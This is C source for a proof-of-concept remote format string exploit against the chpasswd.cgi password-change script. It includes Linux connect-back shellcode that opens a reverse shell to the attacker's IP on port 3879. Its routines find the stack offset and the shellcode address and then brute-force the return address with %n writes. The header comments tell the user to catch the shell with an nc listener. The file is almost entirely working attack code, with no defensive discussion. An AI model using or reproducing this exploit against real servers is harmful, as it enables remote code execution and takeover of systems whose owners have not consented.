/*
 * PROOF OF CONCEPT CHPASSWD.CGI REMOTE FORMAT STRING EXPLOIT
 * Reference: http://sarg.sourceforge.net/chpasswd.php
 *
 * by skylazart
 * 28/11/2008
 *
 * Thanks savio|dm_@xored 
 *
 * PRIVATE, DO NOT DISTRIBUTE!!!
 */




/*
 * Running:
 * 
 * First: change MY_IP to your ip address to receive to connect back shell to port 3879
 *
 * ./lschpasswdfmt <target>
 * 
 * Using another terminal, just use nc to receive the connect back shell
 * 
 * nc -vvv -l -p 3879
 */




/*
 * TODO: Support FreeBSD and OpenBSD targets;
 *       Finish net.[ch] library to release with this exploit;
 */



#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include <stdarg.h>
#include <errno.h>
#include <time.h>

#include "net.h"


#define MY_IP "127.0.0.1"


#define DEFAULT_CHPASSWD_CGI_PATH "/cgi-bin/chpasswd.cgi"
#define DEFAULT_HTTP_PORT 80

#define SCAN_TIMEOUT 5

#define LOG_FILE "lschpasswd.log"


// Linux connect back shellcode
char lnx_connect_back[] = 
	"\x31\xc0"
	"\xb0\x02"
	"\xcd\x80"
	"\x85\xc0"
	"\x75\x77"
	"\x31\xc0"
	"\xb0\x42"
	"\xcd\x80"
	"\x89\xe5"
	"\x31\xd2"
	"\xb2\x66"
	"\x89\xd0"
	"\x31\xc9"
	"\x89\xcb"
	"\x43"
	"\x89\x5d\xf8"
	"\x43"
	"\x89\x5d\xf4"
	"\x4b"
	"\x89\x4d\xfc"
	"\x8d\x4d\xf4"
	"\xcd\x80"
	"\x31\xc9"
	"\x89\x45\xf4"
	"\x43"
	"\x66\x89\x5d\xec"
	"\x66\xc7\x45\xee\x0f\x27"
	"\xc7\x45\xf0"	 
	"IPIP" 		/* IP address */
	"\x8d\x45\xec"
	"\x89\x45\xf8"
	"\xc6\x45\xfc\x10"
	"\x89\xd0"
	"\x43"
	"\x8d\x4d\xf4"
	"\xcd\x80"
	"\x31\xc9"
	"\x8b\x5d\xf4"
	"\xb0\x3f"
	"\xcd\x80"
	"\x41"
	"\x83\xf9\x03"
	"\x75\xf6"
	"\x31\xc0"
	"\x50"
	"\x68\x2f\x2f\x73\x68"
	"\x68\x2f\x62\x69\x6e"
	"\x89\xe3"
	"\x8d\x54\x24\x08"
	"\x50"
	"\x53"
	"\x8d\x0c\x24"
	"\xb0\x0b"
	"\xcd\x80"
	"\x31\xc0"
	"\x31\xdb"
	"\x40"
	"\xcd\x80"; 


/* Log result */
void
log_result (char * fmt, ...)
{
	FILE * fp;
	va_list ap;
	
	char Date[32];
	time_t now;

	now = time (NULL);
	strftime (Date, sizeof (Date), "%Y/%m/%d %H:%M:%S", localtime (&now));

	fp = fopen (LOG_FILE, "a+");
	if (!fp) {
		printf ("Error opening/creating %s:%s\n", LOG_FILE, strerror (errno));
		return;
	}

	fprintf (fp, "%s - ", Date);
	va_start (ap, fmt);
	vfprintf (fp, fmt, ap);
	va_end (ap);

	fclose (fp);
}

/* Print only printable characters */
inline void
print_result_as_ascii (char * result)
{
	char * ptr;
	int i;

	ptr = NULL;
	ptr = strstr (result, "<font color=red size=+2>");
	
	if (ptr == NULL) {
		ptr = result;
	}

	for (i = 0; i < strlen (result); i++) {
		if (isprint (ptr[i])) {
			printf ("%c", ptr[i]);
		}
	}
	printf ("\n");
	fflush (stdout);
}

/* Save all result stream bytes into result.raw  */
inline void
save_result_raw (char * result, int size)
{
	FILE * fp;
	size_t n;

	fp = fopen ("result.raw", "w+");
	if (!fp)
		return;
	
	n = fwrite (result, size, 1, fp);
	
	fclose (fp);
}


#define HTML_MSG13_BEGIN "<font color=red size=+2>"
#define HTML_MSG13_END1  ":BEEF"
#define HTML_MSG13_END2  ": BEEF"

/* Calculate the length of msg13 */
int
calculate_msg13_length (char * result, int size)
{
	char * begin_msg13_ptr;
	char * end_msg13_ptr;

	/* Message format:
	 *   <font color=red size=+2>\n
	 *   <begin_msg13>: <end_msg13>BEEFAAAA
	 */
	begin_msg13_ptr = strstr (result, HTML_MSG13_BEGIN);
	if (begin_msg13_ptr == NULL) {
		return (-1);
	}
	
	begin_msg13_ptr += strlen (HTML_MSG13_BEGIN);
	begin_msg13_ptr++;	

	end_msg13_ptr = strstr (begin_msg13_ptr, HTML_MSG13_END1);
	if (end_msg13_ptr == NULL) {
		end_msg13_ptr = strstr (begin_msg13_ptr, HTML_MSG13_END2);
	}

	if (end_msg13_ptr == NULL) {
		return (-1);
	}
	
	end_msg13_ptr = strstr (end_msg13_ptr, "BEEF");
	if (begin_msg13_ptr == NULL) {
		return (-1);
	}

	return (end_msg13_ptr - begin_msg13_ptr);
}

/* Verify the CGI script */
int
check_cgi (char * ip, int port, char * cgi_path)
{
	char buffer[128];
	char outbuffer[8192];
	int fd;
	int n;


	fd = net_tcp_nonblock_connect (ip, port, SCAN_TIMEOUT);
	if (fd <= 0) {		
		close (fd);
		return (-1);
	}

	snprintf (buffer, sizeof (buffer)-1, 
		  "GET %s HTTP/1.0\r\n"
		  "Host:%s\r\n\r\n", cgi_path, ip);


	n = write (fd, buffer, strlen (buffer));
	if (n <= 0) {
		close (fd);
		return (-1);
	}

	memset (buffer, 0, sizeof (buffer));       
	while (1) {
		if (!net_has_data (fd, SCAN_TIMEOUT)) {
			break;
		}
		n = read (fd, buffer, sizeof (buffer));
		if (n <= 0) {
			break;
		}
		strncat (outbuffer, buffer, sizeof (outbuffer)-1);
	}

	close (fd);
	if (strlen (outbuffer) == 0) {
		return (-1);
	}

	if (strstr (outbuffer, "name=user") != NULL && 
	    strstr (outbuffer, "name=old_pw") != NULL &&
	    strstr (outbuffer, "name=new_pw") != NULL) {
		return (1);
	}

	return (0);
}

/* Create a string to be used to brute force the return address */
int 
brute_force_return_address (char *buffer, int maxlen, int align, int stack_height, unsigned int shellcode_addr, unsigned int return_addr, int msg13_length)
{
	int i;
	char * ptr;

	int fill_size;
	int nop_length;

	unsigned int lower_16bits;   /* 0x000000ff */
	unsigned int higher_16bits;  /* 0x0000ff00 */
	unsigned int lower_32bits;   /* 0x00ff0000 */
	unsigned int higher_32bits;  /* 0xff000000 */
	
	int format_u_value[4];

	int format_string_out_len;

	char tmpbuffer[128];

	for (i = 0; i < 4; i++) {
		format_u_value[i] = 12;
	}


	strncat (buffer, "user=", maxlen);

	for (i = 0; i < align; i++) {
		strncat (buffer, "S", maxlen);
	}

	ptr = &buffer[strlen (buffer)];

	*(long *)ptr = 0x41414141;
	ptr += 4;
	*(long *)ptr = return_addr;
	ptr += 4;
	*(long *)ptr = 0x41414141;
	ptr += 4;
	*(long *)ptr = ++return_addr;
	ptr += 4;
	*(long *)ptr = 0x41414141;
	ptr += 4;
	*(long *)ptr = ++return_addr;
	ptr += 4;
	*(long *)ptr = 0x41414141;
	ptr += 4;
	*(long *)ptr = ++return_addr;
	ptr += 4;

	*ptr = '\0';

	stack_height--;
	for (i = 0; i < stack_height; i++) {
		strncat (buffer, "%08x", maxlen);
	}

	
	lower_16bits  = (shellcode_addr & 0x000000ff);
	higher_16bits = (shellcode_addr & 0x0000ff00) >> 8;
	lower_32bits  = (shellcode_addr & 0x00ff0000) >> 16;
	higher_32bits = (shellcode_addr & 0xff000000) >> 24;

	
	printf ("DEBUG: %02x %02x %02x %02x\n", higher_32bits, lower_32bits, higher_16bits, lower_16bits);

	format_string_out_len = msg13_length + align + (8 * 4) + (8 * stack_height) + 1 + 12;
	

	/* lower 16 bits */
	while (lower_16bits < format_string_out_len) {
		lower_16bits += 0x100;
	}

	format_u_value[0] += (lower_16bits - format_string_out_len);


	/* higher 16 bits */
	format_string_out_len += format_u_value[0];	
	while (higher_16bits < format_string_out_len) {
		higher_16bits += 0x100;
	}

	format_u_value[1] += (higher_16bits - format_string_out_len);


	/* lower 32 bits */
	format_string_out_len += format_u_value[1];
	while (lower_32bits < format_string_out_len) {
		lower_32bits += 0x100;
	}
	
	format_u_value[2] += (lower_32bits - format_string_out_len);


	/* higher 32 bits */
	format_string_out_len += format_u_value[2];	
	while (higher_32bits < format_string_out_len) {
		higher_32bits += 0x100;
	}

	format_u_value[3] += (higher_32bits - format_string_out_len);	


	/* Creating the format string */

	snprintf (tmpbuffer, sizeof (tmpbuffer), "|%%%du%%n%%%du%%n%%%du%%n%%%du%%n|", format_u_value[0], format_u_value[1], format_u_value[2], format_u_value[3]);


	strncat (buffer, tmpbuffer, maxlen);
	strncat (buffer, "&old_pw=f&new_pw1=lalalele&new_pw2=lalalele&change=Altere+minha+senha&", maxlen);

	fill_size = 1022 - strlen (buffer);
	nop_length = fill_size - strlen (lnx_connect_back);
	
	ptr = &buffer[strlen (buffer)];
	memset (ptr, 0x90, nop_length);

	ptr += nop_length;
	memcpy (ptr, lnx_connect_back, strlen (lnx_connect_back));

	ptr = strstr (buffer, "IPIP");
	if (!ptr) {
		/* XXX??? */
		printf ("ERROR!!!!\n");
		return (-1);
	}
	

	*(long *) ptr = inet_addr (MY_IP);

	save_result_raw (buffer, strlen (buffer));
	
	return (strlen (buffer));
}


/* Create the string to be used to find where shellcode is stored */
int
find_shellcode_addr (char *buffer, int maxlen, int align, int stack_height, unsigned int addr)
{
	int fill_size;
	char * ptr;
	int i;

	strncat (buffer, "user=", maxlen);

	for (i = 0; i < align; i++) {
		strncat (buffer, "S", maxlen);
	}

	strncat (buffer, "BEEF", maxlen);

	ptr = &buffer[strlen (buffer)];
	/* ADDR */
	memcpy (ptr, &addr, sizeof (addr));
	ptr[4] = '\0';

	strncat (buffer, "BEEFADDRBEEFADDRBEEFADDR.", maxlen);

	for (i = 0; i < stack_height; i++) {
		strncat (buffer, "%08x", maxlen);
	}

	strncat (buffer, "|%s|", maxlen);
	
	strncat (buffer, "&old_pw=f&new_pw1=lalalele&new_pw2=lalalele&change=Altere+minha+senha&", maxlen);

	fill_size = 1022 - strlen (buffer);
	for (i = 0; i < (fill_size/4); i++) {
		strncat (buffer, "CCCC", maxlen);
	}	

	// Return the numbers of bytes we have to store the nops+shellcode
	return (fill_size);
}

/* Create a string to find the stack height and aligment */
void
find_stack_distance (char *buffer, int maxlen, int align, int stack_height)
{	
	int i;

	strncat (buffer, "user=", maxlen);

	for (i = 0; i < align; i++) {
		strncat (buffer, "S", maxlen);
	}

	strncat (buffer, "BEEFAAAABEEFADDRBEEFADDRBEEFADDR.", maxlen); 

	for (i = 0; i < stack_height; i++) {
		strncat (buffer, "%08x", maxlen);
	}

	strncat (buffer, "|%08x|", maxlen);
	
	strncat (buffer, "&old_pw=f&new_pw1=lalalele&new_pw2=lalalele&change=Altere+minha+senha", maxlen);
}

/* Create a HTTP post string */
int
post_chpasswd_user (char *ip, int port, char * cgi_path, char * user, 
		    char * outbuffer, int maxlen)
{
	char tmp[8192];
	int fd;
	int n;
  	int tot_out_len;

	fd = net_tcp_nonblock_connect (ip, port, 60);
	if (fd < 0) {
		return (-1);
	}

	snprintf (tmp, sizeof (tmp), 
		  "POST %s HTTP/1.0\r\n"
		  "Host:%s\r\n"
		  "Content-Length: %d\r\n"
		  "\r\n"
		  "%s\r\n\r\n", cgi_path, ip, strlen (user), user);

	n = write (fd, tmp, strlen (tmp));
	if (n <= 0) {
		close (fd);
		return (-1);
	}


	memset (tmp, 0, sizeof (tmp));

	tot_out_len = 0;
	do {
		if (!net_has_data (fd, 10)) {
			break;
		}
		n = read (fd, tmp, sizeof (tmp)-1);
		if (n == 0) {
			break;
		}
		
		tot_out_len += n;
		strncat (outbuffer, tmp, maxlen);
	} while (1);

	close (fd);

	return (tot_out_len);
}


int
main (int argc, char ** argv)
{
	char * host = NULL;
	int port = 0;
	char * cgi_path = NULL;


	char buffer[8192];
	char result[8192];
	int result_size;

	int msg13_length;

	char * ptr;
	char * endPtr;
	
	int align = 0;
	int stack_height = 1;
	
	int found;

	unsigned int expect_shellcode_addr = 0xbfffffff;
	unsigned int expect_return_addr = 0xbffffcff;


	int step = -128;

	int shellcode_addr_found;

	int total_shellcode_addr_retries;
	int total_return_addr_retries;

	int shellcode_size;


	
	puts ("Proof of concept chpasswd.cgi remote format string exploit");
	puts ("by skylazart/dm_ - BufferOverflow & xored");
	puts ("28/11/2008");
	puts ("");


	if (argc < 2) {
		printf ("%s <host> [port] [cgi_path] [return address] [step]\n", argv[0]);
		exit (1);
	}

	host = argv[1];
	if (argc >= 3) {
		port = atoi (argv[2]);
	}

	if (argc >= 4) {
		cgi_path = argv[3];
	}

	if (argc >= 5) { 
		expect_shellcode_addr = strtoul (argv[4], NULL, 16);
	}

	if (argc >= 6) {
		step = atoi (argv[5]);
	}

	if (port == 0) {
		port = DEFAULT_HTTP_PORT;
	}

	if (cgi_path == NULL) {
		cgi_path = DEFAULT_CHPASSWD_CGI_PATH;
	}


	printf (">> Checking CGI script...\n");

	if (check_cgi (host, port, cgi_path) != 1) {
		exit (1);
	}

	printf ("Host: %s port: %d CGI: %s OK!\n", host, port, cgi_path);


	printf (">> Finding stack_height and alignment...\n");
	printf ("ENTER TO CONTINUE...\n");
	getchar ();


	found = 0;
	do {
		//sleep (1);

		memset (buffer, 0, sizeof (buffer));
		memset (result, 0, sizeof (result));

		find_stack_distance (buffer, sizeof (buffer)-1, align, stack_height);

		result_size = post_chpasswd_user (host, port, cgi_path, buffer, result, sizeof (result)-1);
		
		


		printf (">> Finding stack_height (%d), aligment (%d)\n", stack_height, align);

		print_result_as_ascii (result);

		
		ptr = strstr (result, "BEEFAAAA");
		if (ptr == NULL) {
			stack_height++;
			continue;
		}

		if (strstr (result, "|41414141|")) {
			found = 1;
			break;
		}

		if (strstr (result, "|414141")) {
			align++;
			continue;
		}

		if (strstr (result, "|4141")) {
			align += 2;
			continue;
		}

		if (strstr (result, "|41")) {
			align += 3;
			continue;
		}
		
		stack_height++;


		if (stack_height > 200) {
			break;
		}
	} while (found == 0);
		

	if (found == 0) {
		printf (">> Exploit failed trying to find stack height...\n");
		exit (1);
	}


	save_result_raw (result, result_size);
	msg13_length = calculate_msg13_length (result, result_size);

	printf (">> Found Host = %s stack_height = %d align = %d msg13_len = %d\n", host, stack_height, align, msg13_length);	
	printf (">> Finding shellcode address...\n");

	printf ("ENTER TO CONTINUE...\n");
	getchar ();

	if (strstr (result, "FreeBSD")) {
		//XXX: find the correct value for FreeBSD
		// For linux it is 0xbfffxxxx
		expect_shellcode_addr = 0xb5ffffff;
	}

	shellcode_addr_found = 0;
	total_shellcode_addr_retries = 0;
	found = 0;

	do {
		if ((expect_shellcode_addr & 0xff000000) >>24 == 0 ||
		    (expect_shellcode_addr & 0x00ff0000) >>16 == 0 ||
		    (expect_shellcode_addr & 0x0000ff00) >> 8 == 0 ||
		    (expect_shellcode_addr & 0x000000FF)      == 0) {

			printf (">> Skipping address 0x%08x\n", expect_shellcode_addr);

			expect_shellcode_addr += step;
			continue;
		}

		memset (buffer, 0, sizeof (buffer));
		memset (result, 0, sizeof (result));


		printf (">> Finding shellcode address at 0x%08x. (%d)\n", expect_shellcode_addr, ++total_shellcode_addr_retries);
		

		shellcode_size = find_shellcode_addr (buffer, sizeof (buffer)-1, align, stack_height, expect_shellcode_addr);


		post_chpasswd_user (host, port, cgi_path, buffer, result, sizeof (result)-1);


		if (!strstr (result, "Internal Server Error")) {
			printf ("\n");
			print_result_as_ascii (result);
			printf ("\n");

			if ((ptr = strstr (result, "|CCC"))) {
								
				endPtr = strstr (ptr, "CCC|");
				if (!endPtr) {
					//XXX
					expect_shellcode_addr += step;
					continue;
				}

				endPtr += 4;

				if ((endPtr - ptr) < (shellcode_size-20)) {
					step = -16;

					printf (">> &Shellcode found: %s shellcode address: 0x%08x. Finding first byte... (%d of %d)bytes\n", host, expect_shellcode_addr, (endPtr - ptr), shellcode_size);

					expect_shellcode_addr -= (shellcode_size) - (endPtr - ptr);
					continue;
				}
				
				printf (">> &Shellcode found: %s shellcode address: 0x%08x, %d bytes.\n", host, expect_shellcode_addr, (endPtr - ptr));
				
				shellcode_addr_found ++;

				if (shellcode_addr_found == 2) {
					break;
				}

				printf (">> Double checking...\n");
				continue;
			}
		}
		
		expect_shellcode_addr = expect_shellcode_addr + step;
	} while (!found);
		 
	
	printf ("\n\n");
	printf (">> Partial exploit result:\n");
	printf (">> Host address %s stack_height=%d align=%d shellcode address=0x%08x msg13_length=%d\n", host, stack_height, align, expect_shellcode_addr, msg13_length);
	printf (">> Last step: brute force return address...\n");

	log_result ("Host address %s stack_height=%d align=%d shellcode address=0x%08x\n", host, stack_height, align, expect_shellcode_addr);


	printf ("ENTER TO CONTINUE...\n");
	getchar ();



	step = -1;
	total_return_addr_retries = 0;


	for (;;) {
		if ((expect_return_addr & 0xff000000) >>24 == 0 ||
		    (expect_return_addr & 0x00ff0000) >>16 == 0 ||
		    (expect_return_addr & 0x0000ff00) >> 8 == 0 ||
		    (expect_return_addr & 0x000000FF)      == 0) {

			printf (">> Skipping address 0x%08x\n", expect_return_addr);

			expect_return_addr += step;
			continue;
		}

		memset (buffer, 0, sizeof (buffer));
		memset (result, 0, sizeof (result));


		printf (">> Trying return address at 0x%08x. (%d)\r", expect_return_addr, ++total_return_addr_retries);
		
		brute_force_return_address (buffer, sizeof (buffer)-1, align, stack_height, expect_shellcode_addr, expect_return_addr, msg13_length);
		
		if (post_chpasswd_user (host, port, cgi_path, buffer, result, sizeof (result)-1) == 0) {
			continue;
		}
		
		printf ("\n");
		print_result_as_ascii (result);
		printf ("\n");

		expect_return_addr += step;
	}

	return (0);
}
